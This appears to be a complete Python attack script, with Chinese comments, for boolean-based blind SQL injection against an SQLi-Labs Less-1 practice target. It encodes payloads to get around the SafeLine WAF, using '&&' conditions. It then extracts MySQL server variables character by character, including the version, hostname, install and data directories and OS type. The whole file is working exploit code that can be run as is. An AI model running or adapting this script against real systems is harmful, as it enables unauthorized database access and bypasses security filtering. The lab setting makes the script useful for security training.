#!/usr/bin/env python3
"""
SQL-Labs Less-1 长亭雷池WAF绕过 - 布尔盲注 v4 (修复URL编码)
"""

import urllib.request
import sys
import time

TARGET = "http://home.ctfstu.cn:6868/sql/Less-1/"
TRUE_LEN = 0
FALSE_LEN = 0

def http_get(url):
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=8) as resp:
            return len(resp.read())
    except Exception:
        return -1

def calibrate():
    global TRUE_LEN, FALSE_LEN
    true_url = TARGET + "?id=1'%20%26%26%201=1--+"
    false_url = TARGET + "?id=1'%20%26%26%201=2--+"
    TRUE_LEN = http_get(true_url)
    FALSE_LEN = http_get(false_url)
    print(f"[*] TRUE={TRUE_LEN}  FALSE={FALSE_LEN}")
    if TRUE_LEN == FALSE_LEN:
        print("[!] 校准失败!")
        sys.exit(1)

def build_url(cond):
    """构建完整的注入URL，手动处理编码"""
    # cond 应该是类似: @@version > '10.' 的原始SQL条件
    # URL编码空格= %20, > = %3e, 单引号保持原样
    encoded = cond.replace(" ", "%20").replace(">", "%3e").replace("<", "%3c").replace("=", "%3d")
    return TARGET + f"?id=1'%20%26%26%20{encoded}--+"

def check(cond):
    full_url = build_url(cond)
    length = http_get(full_url)
    if length < 0:
        return None
    diff_true = abs(length - TRUE_LEN)
    diff_false = abs(length - FALSE_LEN)
    return diff_true < diff_false

def extract(var, name, max_chars=100):
    """提取 @@变量"""
    print(f"\n[*] 提取 {name} ({var})...")
    
    # 可用字符集（按ASCII顺序，便于比较）
    CHARS = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
    
    result = ""
    for pos in range(1, max_chars + 1):
        found = False
        
        # 逐个字符尝试
        for ch in CHARS:
            # 构造: var > 'result+ch'
            # 如果为 FALSE，说明 var <= 'result+ch'
            test_prefix = f"'{result}{ch}'"
            cond = f"{var} > {test_prefix}"
            
            r = check(cond)
            if r is None:
                time.sleep(0.5)
                r = check(cond)
                if r is None:
                    continue
            
            if not r:
                # var > 'result+ch' 为 FALSE
                if result:
                    # 确认 var > 'result' 为 TRUE
                    prev_cond = f"{var} > '{result}'"
                    if check(prev_cond):
                        result += ch
                        found = True
                        break
                    else:
                        # 已经到末尾了
                        print(f"\n[✓] {name}: {result}")
                        return result
                else:
                    # 第一个字符
                    if ord(ch) > 33:  # 跳过!,用"
                        prev_ch = chr(ord(ch) - 1)
                        prev_cond = f"{var} > '{prev_ch}'"
                        if check(prev_cond):
                            result += ch
                            found = True
                            break
                    elif ch == '!':
                        # ch=33, prev=32(空格)
                        prev_cond = f"{var} > ' '"
                        if check(prev_cond):
                            result += ch
                            found = True
                            break
                        else:
                            result += ' '
                            found = True
                            break
        
        if not found:
            # 二分法精确查找这个字符
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                test_str = f"'{result}{chr(mid)}'"
                cond = f"{var} > {test_str}"
                r = check(cond)
                if r is None:
                    break
                if r:
                    low = mid + 1
                else:
                    if mid > 32:
                        prev_str = f"'{result}{chr(mid-1)}'"
                        prev_cond = f"{var} > {prev_str}"
                        if check(prev_cond) == True:
                            result += chr(mid)
                            found = True
                            break
                    high = mid - 1
            
            if not found and low <= 126:
                result += chr(low)
                found = True
        
        if not found:
            # 检查是否已结束
            end_cond = f"{var} > '{result}'"
            if check(end_cond) != True:
                print(f"\n[✓] {name}: {result}")
                return result
            print(f"\n[-] 位置{pos}无法提取")
            break
        
        print(f"\r  [{pos}] {result}", end="", flush=True)
        time.sleep(0.1)  # 节流
    
    return result

def main():
    print("=" * 65)
    print("  SQL-Labs Less-1 | 长亭雷池WAF绕过 | 布尔盲注 v4")
    print("=" * 65)
    
    calibrate()
    
    # 先用最简单的测试确认URL构造正确
    print("\n[*] 验证基础比较...")
    test = check("@@version > '5'")
    print(f"  @@version > '5': {test} (期待True)")
    test2 = check("@@version > '8'")
    print(f"  @@version > '8': {test2} (期待False)")
    
    if test != True:
        print("[!] 基础比较失败，重新检查URL编码")
        # 直接手动测试
        test_url = TARGET + "?id=1'%20%26%26%20@@version%20%3e%20'5'--+"
        l = http_get(test_url)
        print(f"  手动测试长度: {l} (基准TRUE={TRUE_LEN} FALSE={FALSE_LEN})")
        sys.exit(1)
    
    variables = [
        ("@@version", "MySQL版本"),
        ("@@hostname", "主机名"),
        ("@@basedir", "安装目录"),
        ("@@datadir", "数据目录"),
        ("@@version_compile_os", "操作系统类型"),
    ]
    
    results = {}
    for var, name in variables:
        val = extract(var, name)
        if val:
            results[name] = val
    
    print("\n\n" + "=" * 65)
    print("  提取结果")
    print("=" * 65)
    for name, value in results.items():
        print(f"  {name}: {value}")

if __name__ == "__main__":
    main()
